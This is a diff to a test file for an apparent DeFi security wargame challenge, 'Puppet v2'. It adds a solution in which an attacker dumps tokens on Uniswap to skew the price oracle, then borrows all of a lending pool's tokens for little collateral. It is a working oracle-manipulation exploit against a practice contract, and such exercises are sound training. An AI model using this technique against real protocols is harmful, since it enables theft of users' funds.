@@ -85,7 +85,25 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     after(async function () {
+        /* function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)external returns (uint[] memory amounts);
+        */
         /** SUCCESS CONDITIONS */
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp
+        let wethAddress = await this.uniswapRouter.WETH();
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+                ATTACKER_INITIAL_TOKEN_BALANCE.sub(10), // for the test case
+                1,
+                [this.token.address, wethAddress], // DVT and WETH address
+                attacker.address,                                
+                deadline + 10
+        );
+
+        // calculate how much collateral is needed and borrow all the DVT tokens
+        const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await this.weth.connect(attacker).deposit({ value: collateral });
+        await this.weth.connect(attacker).approve(this.lendingPool.address, collateral); // approve weth in advance before borrowing
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
 
         // Attacker has taken all tokens from the pool        
         expect(
